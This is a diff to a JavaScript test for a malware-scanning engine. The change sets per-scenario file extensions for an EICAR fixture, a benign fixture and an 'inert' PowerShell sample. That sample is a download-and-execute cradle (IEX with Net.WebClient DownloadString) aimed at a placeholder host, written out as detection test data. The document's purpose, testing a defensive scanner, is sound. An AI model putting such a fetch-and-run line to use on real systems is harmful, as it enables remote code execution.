@@ -148,21 +148,24 @@ test("JB Threat Lab exercises Malware Engine, Security Guard and Expert QA again
     capabilities: ["static-file-triage", "hash-signatures", "byte-signatures", "heuristics"],
     adapter: {
       async runScenario({ scenario }) {
-        const fixturePath = path.join(malwareFixtures, scenario.id.replaceAll(".", "-") + ".sample");
+        let extension = ".txt";
         let bytes;
         let expectedStatus;
         if (scenario.id === "malware.eicar.harmless-test") {
           bytes = EXPECTED_EICAR;
           expectedStatus = "malicious";
+          extension = ".com";
         } else if (scenario.id === "malware.benign.no-false-positive") {
           bytes = Buffer.from("JB Threat Lab benign text fixture; inert data only.");
           expectedStatus = "no_match";
         } else if (scenario.id === "malware.suspicious.inert-script") {
           bytes = Buffer.from("IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a')");
           expectedStatus = "suspicious";
+          extension = ".ps1";
         } else {
           return outcome("skip", "No Malware Engine handler for this scenario");
         }
+        const fixturePath = path.join(malwareFixtures, scenario.id.replaceAll(".", "-") + extension);
         await writeFile(fixturePath, bytes, { flag: "wx" });
         const report = await malwareEngine.scanFile(fixturePath);
         const passed = report.status === expectedStatus;
